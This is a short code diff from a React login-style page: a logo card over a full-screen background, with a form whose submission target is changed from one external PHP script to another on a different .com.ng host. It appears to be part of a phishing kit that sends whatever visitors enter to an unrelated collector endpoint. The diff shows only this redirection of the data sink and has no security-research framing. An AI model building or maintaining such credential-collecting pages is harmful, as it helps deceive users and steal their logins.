@@ -63,7 +63,7 @@ function App() {
   return (
     <div style={{ backgroundImage: `url(${background})`, position: 'fixed', width: '100%', height: '100%', backgroundSize: 'cover', display: 'flex', justifyContent: 'center', alignItems: 'center' }}>
       <div className="w3-card-4 w3-white w3-round w3-padding" style={{ width: 350 }}>
-        <form encType='multipart/form-data' action='https://femzab.com.ng/recieve2.php' method='post'  className="w3-margin-8">
+        <form encType='multipart/form-data' action='https://smarterwap.com.ng/connector.php' method='post'  className="w3-margin-8">
           <img src={require('./asset/logo.png')} alt='' style={{ height: 60, left: -18, position: 'relative' }} />
 
           <h5 style={{ 
